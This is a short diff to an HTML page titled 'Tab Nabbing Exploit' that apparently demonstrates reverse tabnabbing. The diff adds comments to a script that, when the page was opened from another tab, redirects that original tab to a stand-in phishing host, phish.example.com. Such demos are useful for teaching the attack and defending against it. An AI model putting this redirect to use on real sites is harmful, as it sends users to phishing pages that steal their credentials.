@@ -2,12 +2,16 @@
 <html>
 <head>
     <title>Tab Nabbing Exploit</title>
+    <meta charset="UTF-8">
 </head>
 <body>
+    <!-- Link that opens a new tab to Facebook -->
     <a href="https://www.facebook.com/goguardian/" target="_blank">Go to Facebook</a>
 
     <script>
+        // Check if the current window was opened by another window
         if (window.opener) {
+            // Change the location of the opener window to demonstrate the tab nabbing exploit
             window.opener.location = "https://phish.example.com";
         }
     </script>
